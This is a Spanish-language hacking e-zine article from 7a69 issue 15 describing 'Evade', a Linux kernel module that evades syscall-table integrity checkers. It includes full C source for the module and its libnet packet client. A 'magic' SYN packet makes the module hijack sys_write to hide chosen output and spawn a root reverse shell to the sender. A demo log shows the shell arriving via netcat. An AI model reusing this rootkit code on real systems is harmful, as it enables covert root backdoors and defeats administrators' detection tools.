@@ -1,0 +1,575 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#15 ]                                                  [ 23-11-2003 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 11 - Evadiendo LKM Checkers.                                   }{ Fkt }
+   |-----------------------------------------------------------------------|
+
+
+
+- Indice:
+  1. Introduccion
+  2. Implementacion
+  3. La Practica
+  4. Codigo Comentado (Programa Evade)
+  5. Conclusion
+  6. Agradecimientos
+
+           -----------------------------------------------------
+
+1. Introduccion:
+  Lo que voy a contar no es nada espectacular, simplemente que el otro dia
+  se me vino a la cabeza la idea, me parecio innovadora y como en ningun 
+  sitio he visto que se hable de algo parecido pues me he animado a
+  contarosla.
+  Debido a la proliferacion de programas que checkean la sys_call_table[] 
+  se me ocurrio la idea de troyanizar el kernel momentaneamente, de forma que
+  el programa que checkee la sys_call_table[] no se de cuenta de que esta
+  "hackeada", a no ser que el programa este chequeando constatemente (cosa
+  bastante rara).
+  Una cosa mas antes de empezar, las tildes, acentos o como querais llamarlos
+  no estan puestos para que no salgan caracteres raros para la gente que lea
+  el articulo en el edit del MS-DOS por ejemplo.
+
+2. Implementacion:
+  Bueno vamos a ver como hariamos eso de troyanizar el kernel momentaneamente.
+  El metodo que he escogido es filtrando en un hook del netfilter los paquetes
+  que llegan mediante un modulo del kernel que los analize, de tal forma que
+  cuando llegue cierto paquete a la maquina comprometida se cambien las
+  direcciones de la sys_call_table[] por las q nos convengan, y cuando 
+  terminemos de urgar en la maquina con otro paquetito las restauramos, con lo
+  cual no se deberia estar demasiado tiempo dentro si el admin es paranoico
+  jeje.
+
+  Bien, para hacer esto filtraremos el hook NF_IP_LOCAL_IN del netfilter tal
+  que asi:
+
+  NOTA: Para mas informacion sobre netfilter y sus hooks leer el articulo 
+        de Raciel en la X-Ezine #1 en http://todo-linux.com/x-ezine/.
+
+  static unsigned int input_handler(unsigned int hook, struct sk_buff **skb,
+                                    const struct net_device *in,
+                                    const struct net_device *out, 
+                                    int (*okfn) (struct sk_buff *)) {
+
+    char *payload;
+    unsigned int datalen;
+
+    /* Si el paquete no va para nosotros ni es TCP lo dejamos seguir y no 
+       hacemos nada */
+    if (((*skb)->pkt_type != PACKET_HOST) ||
+        ((*skb)->nh.iph->protocol != IPPROTO_TCP))
+       return NF_ACCEPT;
+
+    /* Ajustamos el paquete TCP */
+    (*skb)->h.raw=(unsigned char *)(*skb)->nh.raw + (*skb)->nh.iph->ihl*4;
+    datalen=(*skb)->len - (*skb)->nh.iph->ihl*4 + ((*skb)->h.th->doff <<2);
+    payload=(char *)(*skb)->h.raw + ((*skb)->h.th->doff <<2);
+
+    /* Si el paquete no viene por el puerto 80 con el flag SYN
+       activado no hacemos nada */
+    if (!(*skb)->h.th->syn || ((*skb)->h.th->dest != htons(80)))
+      return NF_ACCEPT;
+
+    /* Filtramos asi los paquetes para no tener que procesar muchos y que la 
+       maquina no se sobrecargue */
+
+    /* Comparamos el payload para ver si es un "paquete magico" */
+    /* Y de que tipo de paquete magico es, si para restaurar la */
+    /* sys_call_table[] o para "hackearla"                      */
+    if (!strncmp(payload,MAGIC_WORD_ENABLED,datalen)) {
+      /* Hackeamos la syscall */
+      sys_call_table[__NR_write]=my_write;
+
+      /* Rechazamos el paquete para no levantar sospechas */
+      return NF_DROP;
+    }
+
+    if (!strncmp(payload,MAGIC_WORD_DISABLED,datalen)) {
+      /* Restauramos la syscall */
+      sys_call_table[__NR_write]=write_orig;
+      return NF_DROP;
+    }
+
+    /* Si llega aqui no es un "paquete magico" asi que lo dejamos seguir */
+    return NF_ACCEPT;
+  }
+
+  En este codigo cambiariamos momentaneamente (hasta que mandasemos el paquete
+  de restauracion) la direccion de la syscall write por la nuestra, obviamente
+  se podrian hacer otras cosas.
+
+3. La Practica:
+  En este apartado explicare como usar Evade, cuyo codigo fuente esta en 
+  el siguiente punto.
+  Supongo que el modulo se ha compilado para ver los mesajes del syslogd 
+  con -DDEBUG.
+
+  Lo cargamos:
+  lame_host# /sbin/insmod evade.o
+  lame_host#
+
+  Jul 30 12:56:08 lame_host kernel: [Evade] Modulo Cargado Correctamente
+
+  my_host (tty1) $ nc -lvp 31337
+  listening on [any] 31337 ...
+
+  my_host (tty2) # ./cliente lame_host "abrete sesamo" my_host 31337
+  Paquete Mandado Correctamente a lame_host
+  my_host (tty2) #
+
+  Jul 30 12:59:01 lame_host kernel: [Evade] Paquete Magico De Activacion Recibido Desde 192.168.0.10
+  Jul 30 12:59:02 lame_host kernel: [Evade] Socket Creado
+  Jul 30 12:59:02 lame_host kernel: [Evade] Conectado A: 192.168.0.10:31337
+
+  Y en el netcat de antes vemos...
+  connect to [192.168.0.10] from lame_host [192.168.0.20] 4049
+  w
+    7:02pm  up  1:09,  2 users,  load average: 0.14, 0.08, 0.09
+  USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+  john     tty1     -                 5:58pm  0.00s  0.71s  0.00s  nc -lvp 31337
+  marlon   tty2     -                 6:33pm 13.00s  2.92s  2.25s  bash
+  id
+  uid=0(root) gid=0(root)
+  uname -a
+  Linux lame_host 2.4.17 #2 Mon Jan 21 00:03:19 CET 2002 i686 unknown
+  echo "hola"
+  
+  /* Como vemos no escribe nada */
+
+  Mandamos el paquete de restauracion:
+  my_host (tty2) # ./cliente lame_host "cierrate sesamo" my_host
+  Paquete Mandado Correctamente a lame_host
+  my_host (tty2) #
+
+  Jul 30 13:01:03 lame_host kernel: [Evade] Paquete Magico De Restauracion Recibido Desde 192.168.0.10
+
+  echo "hola"
+  hola
+  
+  /* Wuala! ahora si lo escribe jeje */
+  exit
+  /* Control+C */
+  punt!
+  my_host (tty1) $
+
+  lame_host# /sbin/rmmod evade
+  Jul 30 13:03:42 lame_host kernel: [Evade] Modulo Descargado Correctamente
+
+4. Codigo Comentado (Programa Evade):
+  Evade es un "Proof Of Concept" de lo que he contado, espero que se 
+  entienda y podais seguirlo con los comentarios sin ningun problema.
+  Lo que hace Evade es abrir una shell al "source port" donde le llegue el 
+  paquete en el host que mando el paquete magico, asi como troyanizar la
+  syscall write, que luego con otro paquete magico se podra restaurar.
+  Quiero aclarar antes de poner el codigo que Evade no es ningun rootkit 
+  completo ni mucho menos, simplemente demuestra la utilidad de esta 
+  "tecnica".
+
+  Para compilarlo: (es necesaria la libreria libnet)
+    gcc -O3 -c -Wall -fomit-frame-pointer -I/usr/src/linux/include/ evade.c
+    gcc `libnet-config --defines` cliente.c -o cliente -lnet
+
+  NOTA: Para mas informacion sobre Libnet leer el articulo numero 2 del 
+        #12 de la 7a69 E-Zine.
+
+  <-++-> evade.c :
+
+  /*         Evade          */
+  /* fkt <fkt@funfatal.org> */
+  /*      30-07-2002        */
+
+  #define __KERNEL__
+  #define MODULE
+
+  #include <linux/kernel.h>
+  #include <linux/module.h>
+  #include <linux/version.h>
+
+  #include <asm/unistd.h>
+  #include <asm/uaccess.h>
+  #include <asm/segment.h>
+  #include <linux/slab.h>
+  #include <linux/ip.h>   
+  #include <linux/tcp.h>
+  #include <linux/in.h>
+  #include <linux/skbuff.h>
+  #include <linux/netdevice.h>
+  #include <linux/netfilter_ipv4.h>
+  #include <linux/sched.h>
+  #include <linux/tqueue.h>
+
+  MODULE_LICENSE("GPL");
+  MODULE_AUTHOR("fkt <fkt@funfatal.org>");
+  
+  /* Macros que deberias cambiar :) */
+  #define MAGIC_WORD_ENABLED "abrete sesamo"
+  #define MAGIC_WORD_DISABLED "cierrate sesamo"
+  #define CENSURED_WORD "hola"
+
+  /* Sin comentarios :) */
+  extern void *sys_call_table[];
+
+  /* Estructura a rellenar del hook del netfilter */
+  static struct nf_hook_ops input_filter;
+
+  /* Estructura a rellenar de la task_queue */
+  static struct tq_struct st_proc;
+
+  /* Estructura global con la que pasaremos parametros a run_shell() */
+  struct {
+    __u16 puerto;
+    __u32 addr;
+  } datos;
+
+  /* Syscalls que nos haran falta luego, ahi que declararlas asi porque sino 
+     peta */
+  static int errno;
+  static inline _syscall0(int, fork);
+  static inline _syscall3(int, execve, char *, name, char **, argv, char **, envp);
+
+  /* Puntero a sys_write original */
+  ssize_t (*o_write)(int fd, const void *buf, size_t count);
+  
+  /* Punteros a syscalls que luego usaremos */
+  int (*o_socketcall)(int call, unsigned long *args);
+  void (*o_exit)(int status);
+  int (*o_close)(int fd);
+  int (*o_dup)(int oldfd);
+
+  /* Nuestro sys_write */
+  ssize_t my_write(int fd, const void *buf, size_t count);
+
+  /* Rutina que conectara y ejecutara la shell */
+  void run_shell(void) {
+    struct sockaddr_in local_addr;
+    char *args[2];
+    unsigned long socket_args[3]; 
+    mm_segment_t fs;
+    int sockfd;
+
+    /* Cambiamos el rango de direcciones para no tener problemas al llamar 
+       a la syscall, ya que esta supone que la llamamos desde espacio de 
+       usuario */
+    fs=get_fs(); 
+    set_fs(KERNEL_CS);
+
+    o_close(2);
+    o_close(1);
+    o_close(0);
+
+    socket_args[0]=AF_INET;
+    socket_args[1]=SOCK_STREAM;
+    socket_args[2]=IPPROTO_TCP;
+
+    if ((sockfd=o_socketcall(SYS_SOCKET,socket_args)) != -1) {
+
+  #ifdef DEBUG
+    printk("[Evade] Socket Creado\n");
+  #endif
+      
+      local_addr.sin_port=datos.puerto;
+      local_addr.sin_family=AF_INET;
+      local_addr.sin_addr.s_addr=datos.addr;
+  
+      socket_args[0]=sockfd;
+      socket_args[1]=(unsigned long)&local_addr;
+      socket_args[2]=sizeof(struct sockaddr_in);
+  
+      if (o_socketcall(SYS_CONNECT,socket_args) == 0) {
+        
+  #ifdef DEBUG
+    printk("[Evade] Conectado A: %u.%u.%u.%u:%d\n",
+            NIPQUAD(local_addr.sin_addr.s_addr), ntohs(local_addr.sin_port));
+  #endif
+       
+        if (!fork()) {
+          o_dup(2);
+          o_dup(1);
+          o_dup(0);
+
+          args[0]="/bin/sh";
+          args[1]=NULL;
+
+          execve(args[0], args, NULL);
+
+          o_exit(1);
+        }
+      }
+    }
+
+    /* Restauro el rango */    
+    set_fs(fs);
+
+    if (sockfd > 0) o_close(sockfd);
+  }
+
+  static unsigned int input_handler(unsigned int hook, struct sk_buff **skb,
+                                    const struct net_device *in,
+                                    const struct net_device *out,
+                                    int (*okfn) (struct sk_buff *)) {
+     
+    char *payload;
+    unsigned int datalen;
+  
+    /* Si el paquete no va para nosotros ni es TCP lo dejamos seguir y no   
+       hacemos nada */
+    if (((*skb)->pkt_type != PACKET_HOST) ||
+        ((*skb)->nh.iph->protocol != IPPROTO_TCP))
+       return NF_ACCEPT;
+  
+    /* Ajustamos el paquete TCP */
+    (*skb)->h.raw=(unsigned char *)(*skb)->nh.raw + (*skb)->nh.iph->ihl*4;
+    datalen=(*skb)->len - (*skb)->nh.iph->ihl*4 + ((*skb)->h.th->doff <<2);
+    payload=(char *)(*skb)->h.raw + ((*skb)->h.th->doff <<2);
+        
+    /* Si el paquete no viene por el puerto 80 con el flag SYN
+       activado no hacemos nada */
+    if (!(*skb)->h.th->syn || ((*skb)->h.th->dest != htons(80)))
+      return NF_ACCEPT;
+
+    /* Filtramos asi los paquetes para no tener que procesar muchos y que la
+       maquina no se sobrecargue */ 
+ 
+    /* Comparamos el payload para ver si es un "paquete magico" */
+    /* Y de que tipo de paquete magico es, si para restaurar la */
+    /* sys_call_table[] o para "hackearla"                      */
+    if (!strncmp(payload,MAGIC_WORD_ENABLED,datalen)) {
+                                  
+  #ifdef DEBUG
+    printk("[Evade] Paquete Magico De Activacion Recibido Desde %u.%u.%u.%u\n",
+            NIPQUAD((*skb)->nh.iph->saddr));
+  #endif
+  
+      /* Hackeamos la syscall */
+      sys_call_table[__NR_write]=my_write;  
+      
+      /* Rellenamos la estructura del task_queue */
+      st_proc.sync=0;
+      st_proc.routine=(void *)&run_shell; 
+      st_proc.data=NULL;
+  
+      /* Rellenamos la struct global */
+      datos.puerto=(*skb)->h.th->source;
+      datos.addr=(*skb)->nh.iph->saddr;
+     
+      /* Encolamos el proceso para ser ejecutado */
+      schedule_task(&st_proc);
+  
+      /* Rechazamos el paquete para no levantar sospechas */
+      return NF_DROP;
+    }
+  
+    if (!strncmp(payload,MAGIC_WORD_DISABLED,datalen)) {
+  
+  #ifdef DEBUG
+    printk("[Evade] Paquete Magico De Restauracion Recibido Desde %u.%u.%u.%u\n",
+            NIPQUAD((*skb)->nh.iph->saddr));
+  #endif
+        
+      /* Restauramos la syscall */
+      sys_call_table[__NR_write]=o_write;
+      return NF_DROP;
+    }
+      
+    /* Si llega aqui no es un "paquete magico" asi que lo dejamos seguir */
+    return NF_ACCEPT;
+  }
+    
+  /* sys_write "hackeada" que hara que los write's que contengan la cadena
+     CENSURED_WORD no se escriban */   
+  ssize_t my_write(int fd, const void *buf, size_t count) {
+    /* Reservamos memoria en espacio de kernel para comparar luego con buf */
+    char *buf_k=(char *)kmalloc(count+1, GFP_KERNEL);
+    
+    /* Pasamos buf a espacio de kernel */
+    memset(buf_k,0,count+1);
+    __generic_copy_from_user(buf_k, buf, count);
+    
+    /* Si no contiene nuestra cadena a "borrar" devolvemos el valor de la
+       sys_write original */
+    if (!strstr(buf_k,CENSURED_WORD)) {
+      kfree(buf_k);
+      return ((*o_write)(fd,buf,count));
+    }
+
+    /* Libero la memoria reservada */
+    kfree(buf_k);
+  
+    /* Si llega aqui quiere decir que nuestra cadena esta en buf, por lo
+       tanto retornamos count para decir que todo ha ido bien pero nuestra
+       cadena no se ha escrito */
+    return count;
+  }       
+    
+  int init_module(void) {
+    int ret;
+   
+    /* Para que no exporte los simbolos a ksyms */
+    EXPORT_NO_SYMBOLS;
+  
+    /* Rellenamos la estructura del hook del netfilter */
+    input_filter.list.next=NULL;
+    input_filter.list.prev=NULL;
+    input_filter.hook=input_handler;   
+    input_filter.priority=NF_IP_PRI_FILTER-1;
+    input_filter.pf=PF_INET; /* IPv4 */
+    input_filter.hooknum=NF_IP_LOCAL_IN;
+    
+    /* Registramos la estructura */
+    ret=nf_register_hook(&input_filter);
+  
+    /* Si no se ha podido registrar devolvemos error para que el modulo no
+       se cargue */
+    if (ret) return -1;
+  
+    /* Guaradamos la direccion de la sys_write original */
+    o_write=sys_call_table[__NR_write];
+     
+    o_exit=sys_call_table[__NR_exit];
+    o_close=sys_call_table[__NR_close];
+    o_socketcall=sys_call_table[__NR_socketcall];
+    o_dup=sys_call_table[__NR_dup];
+
+  #ifdef DEBUG
+    printk("[Evade] Modulo Cargado Correctamente\n");
+  #endif
+  
+    return ret;
+  }
+  
+  void cleanup_module(void) {   
+    /* Desregistramos el hook */
+    nf_unregister_hook(&input_filter);
+  
+    /* Ponemos la sys_write original donde estaba por si no hemos mandado el
+       paquete de restaurar */
+    sys_call_table[__NR_write]=o_write;
+
+  #ifdef DEBUG
+    printk("[Evade] Modulo Descargado Correctamente\n");
+  #endif
+  
+  } 
+
+  <-++-> cliente.c :
+
+  /*      Cliente Evade       */
+  /*  fkt <fkt@funfatal.org>  */
+  /*       30-07-2002         */
+
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <string.h>
+  #include <unistd.h>
+  #include <sys/types.h>
+  #include <sys/socket.h>
+  #include <libnet.h>
+
+  #define PUERTO_DESTINO 80
+
+  void uso(char *prog);
+  void manda_pkt_tcp(int sd, int payload_s, unsigned int srcp, unsigned int
+                     dstp, u_long srcaddr, u_long dstaddr,
+                     unsigned char *payload);
+
+  int main(int argc, char **argv) {
+    u_long daddr, saddr;
+    int payload_sz, sockfd;
+    unsigned char *payload;
+
+    /* Miro si tiene privilegios de root */
+    if (geteuid()) {
+      printf("Necesitas Ser ROOT!!\n");
+      exit(1);
+    }
+
+    if (argc != 5) uso(argv[0]);
+
+    /* Resuelvo las direcciones */
+    if (((daddr=libnet_name_resolve(argv[1],LIBNET_RESOLVE))==-1) ||
+        ((saddr=libnet_name_resolve(argv[3],LIBNET_RESOLVE))==-1))
+      libnet_error(LIBNET_ERR_FATAL, "Host Name Lookup failed!\n");
+
+    payload=(unsigned char *)argv[2];
+    payload_sz=strlen(payload)+1; //El +1 para que se mande tambien el \0
+
+    /* Inicio el generador aleatorio de numeros */
+    if (libnet_seed_prand()==-1)
+      libnet_error(LIBNET_ERR_FATAL, "libnet_seed_prand failed!\n");
+
+    /* Abro el interfaz del socket */
+    if((sockfd=libnet_open_raw_sock(IPPROTO_RAW))==-1)
+      libnet_error(LIBNET_ERR_FATAL, "libnet_open_raw_sock failed!\n");
+
+    /* Mando el paquete */
+    manda_pkt_tcp(sockfd, payload_sz, atoi(argv[4]), PUERTO_DESTINO,
+                  saddr, daddr, payload);
+
+    /* Cierro el interfaz */
+    libnet_close_raw_sock(sockfd); 
+    printf("Paquete Mandado Correctamente a %s\n", argv[1]);
+  
+    return 0;
+  }
+  
+  void uso(char *prog) {
+    printf("\nCliente Para Evade\n");
+    printf("Uso:\n");
+    printf("\t%s <host_dst> <MAGIC_WORD> <host_local> <src_port>\n\n", prog);
+    exit(1);
+  }
+  
+  void manda_pkt_tcp(int sd, int payload_s, unsigned int srcp, unsigned int
+                     dstp, u_long srcaddr, u_long dstaddr,
+                     unsigned char *payload) {
+    unsigned int pkt_size;
+    int c;
+    unsigned char *buf;
+  
+    pkt_size=LIBNET_IP_H+LIBNET_TCP_H+payload_s;
+
+    /* Reservo memoria para el paquete */
+    if (libnet_init_packet(pkt_size, &buf)==-1)
+      libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed!\n");  
+
+    /* Construyo la parte IP del paquete */
+    libnet_build_ip(pkt_size-LIBNET_IP_H, IPTOS_LOWDELAY, //TOS
+                    libnet_get_prand(PRu16), 0, 64, IPPROTO_TCP,
+                    srcaddr, dstaddr, NULL, 0, buf);
+  
+    /* Construyo la parte TCP del paquete */
+    libnet_build_tcp(srcp, //src_port
+                     dstp, //dst_port
+                     100, //seq
+                     0, //ack
+                     TH_SYN, //flags
+                     512, //window size
+                     0, //URG?
+                     payload,
+                     payload_s,
+                     buf + LIBNET_IP_H); //puntero al pkt
+ 
+    /* Hago el checksum */
+    if (libnet_do_checksum(buf, IPPROTO_TCP, pkt_size-LIBNET_IP_H)==-1)
+      libnet_error(LIBNET_ERR_FATAL, "libnet_do_checksum failed!\n");
+
+    /* Mando el paquete */
+    c=libnet_write_ip(sd,buf,pkt_size);
+    if (c < pkt_size)
+      libnet_error(LIBNET_ERR_WARNING, "libnet_write_ip solo ha podido escribir %d bytes\n", c);
+
+    /* Libero la memoria del paquete */  
+    libnet_destroy_packet(&buf);
+  }
+
+5. Conclusion:
+  Bueno, pues como habeis visto no era nada espectacular, pero si practico,
+  el ejemplo que he puesto en el articulo es un poco tonto pero creo que
+  ilustra bien la utilidad de la "tecnica" y que sabreis explotarla a fondo.
+
+6. Agradecimientos:
+  A Doing por ser tan buena persona y tener tanta paciencia :)
+
+
+*EOF*
